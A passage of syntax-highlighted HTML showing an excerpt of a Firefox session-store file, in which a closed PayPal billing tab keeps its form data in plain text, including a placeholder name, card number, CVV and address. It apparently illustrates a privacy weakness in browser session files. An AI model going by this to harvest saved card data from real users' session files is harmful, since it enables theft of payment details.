class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"selected"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"_closedTabs"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"state"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"entries"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"url"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"about:home"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"title"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Mozilla Firefox Start Page"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"ID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docshellID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"owner_b64"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"NhAra3tiRRqhyKDUVsktxQAAAAAAAAAAwAAAAAAAAEYAAQAAAAAAAS8nfAAOr03buTZBMmukiq45X+BFfRhK26P9r5jIoa8RAAAAAAVhYm91dAAAAARob21lAODaHXAvexHTjNAAYLD8FKM5X+BFfRhK26P9r5jIoa8RAAAAAA5tb3otc2FmZS1hYm91dAAAAARob21lAAAAAA=="</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docIdentifier"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"url"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"http:\/\/www.stuffbysarah.net\/"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"title"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Stuff by Sarah"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"ID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docshellID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docIdentifier"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"url"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"https:\/\/www.paypal.com\/uk\/cgi-bin\/webscr?cmd=_flow&amp;amp;SESSION=bZOIeDb0Pkhss8uFCWB9TM0mnA1cCugBmxDUkBKIaGD_dWUEC49NT0MTATm&amp;amp;dispatch=5885d80a13c0db1f8e263663d3faee8d7283e7f0184a5674430f290db9e9c846"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"title"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Billing Information - PayPal"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"ID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docshellID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"referrer"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"http:\/\/www.stuffbysarah.net\/"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docIdentifier"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"children"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"url"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"about:blank"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"ID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-55"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docshellID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"owner_b64"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"NhAra3tiRRqhyKDUVsktxQAAAAAAAAAAwAAAAAAAAEYAAQAAAAAAAd6UctCANBHTk5kAEEug\/UA5X+BFfRhK26P9r5jIoa8RAAAAAv\/\/\/\/8AAAG7AQAAAMBodHRwczovL3d3dy5wYXlwYWwuY29tL3VrL2NnaS1iaW4vd2Vic2NyP2NtZD1fZmxvdyZTRVNTSU9OPWJaT0llRGIwUGtoc3M4dUZDV0I5VE0wbW5BMWNDdWdCbXhEVWtCS0lhR0RfZFdVRUM0OU5UME1UQVRtJmRpc3BhdGNoPTU4ODVkODBhMTNjMGRiMWY4ZTI2MzY2M2QzZmFlZThkNzI4M2U3ZjAxODRhNTY3NDQzMGYyOTBkYjllOWM4NDYAAAAAAAAABQAAAAgAAAAOAAAACP\/\/\/\/8AAAAI\/\/\/\/\/wAAAAgAAAAOAAAAFgAAAKoAAAAWAAAAEgAAABYAAAAMAAAAIgAAAAYAAAAi\/\/\/\/\/wAAAAD\/\/\/\/\/AAAAKQAAAJcAAAAW\/\/\/\/\/wEAAAAAAAAAAAABAAA="</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docIdentifier"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"scroll"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"0,0"</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-60"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"formdata"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#amount"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"9001"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#country_code"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#first_name"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"John"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#last_name"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Doe"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#credit_card_type"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#cc_number"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"1111-2222-3333-4444-5555"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#expdate_month"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"01"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#expdate_year"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"12"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#cvv2_number"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"123"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#address1"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Doestreet 1"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-72"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#city"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Johntown"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#state"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#zip"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"9001"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#H_PhoneNumber"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"22523 30999"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"#email-address"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"john.doe@doe.john"</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-77"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-78"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"scroll"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"0,428"</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-79"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-80"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-81"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"index"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-82"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"hidden"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-83"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"attributes"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-84"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"image"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"https:\/\/www.paypalobjects.com\/en_US\/i\/icon\/pp_favicon_x.ico"</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-85"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-86"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-87"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"title"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Billing Information - PayPal"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-88"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"image"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"https:\/\/www.paypalobjects.com\/en_US\/i\/icon\/pp_favicon_x.ico"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-89"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"pos"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-90"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-91"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-92"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"width"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">938</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-93"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span 